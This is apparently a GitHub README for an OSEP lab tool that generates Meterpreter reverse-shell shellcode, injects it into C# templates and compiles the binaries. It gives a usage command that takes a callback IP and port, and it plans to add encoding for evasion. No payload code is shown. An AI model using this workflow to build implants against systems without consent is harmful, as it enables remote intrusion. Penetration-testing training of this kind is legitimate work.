# laz-y
Automating payload generation for OSEP labs and exam. This tool generates x86 and x64 meterpreter shellcodes, injects them in your CS templates, and generate binaries using mcs. Will soon support ROT and XOR encoding.

## But, why?
The VPN connection dropped during one of the OSEP challenge labs, and my local IP changed. I needed to recompile all the payloads and tools.. I did not, I wrote a script :) 

## How does it work?
THIS REPO DOES NOT PROVIDE TEMPLATES.  
When started, the python script will search for marks in all files you put in the "templates" folder and swap the marks for the MSF payload. It then exports the modified template files in the "output" folder, and run "mcs" C# compiler on all *.cs files.
You end up with :
* Your initial templates, untouched
* The templates with marks replaced with MSF payloads
* If the templates are .cs, the resulting C# binaries

## Installation
This script has only been tested on Kali.
* `sudo apt update && sudo apt install mono-mcs -y`
* `git clone https://github.com/Nariod/laz-y.git`
* `cd laz-y`
* `pip3 install -r requirements.txt`

## Usage
* Add your CS templates in the "templates" folder
* Add the mark `!!! FIND ME PYTHON, PLZ !!!` in the templates, where you want the shellcode to be injected
* Run the script with `python3 laz-y.py -l CALLBACK_IP -p CALLBACK_PORT`

## To do
- [x] Basic mark for shellcode swaping
- [ ] Add ROT encoding support
- [ ] Add XOR encoding support

## Credits
* Stackoverflow 

## Legal disclaimer
Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.